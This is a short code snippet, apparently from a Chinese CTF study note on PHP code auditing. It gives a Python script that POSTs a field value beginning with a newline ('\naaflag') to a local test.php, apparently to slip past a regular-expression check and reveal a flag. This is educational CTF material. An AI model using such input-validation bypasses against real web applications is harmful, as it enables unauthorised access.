# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/php代码审计.md
# TITLE: php代码审计
# CATEGORY: web

import requests

url = "http://127.0.0.1/test.php";
data = {
    "x": "\naaflag"
}
res = requests.post(url=url, data=data,allow_redirects=False)
print(res.text)
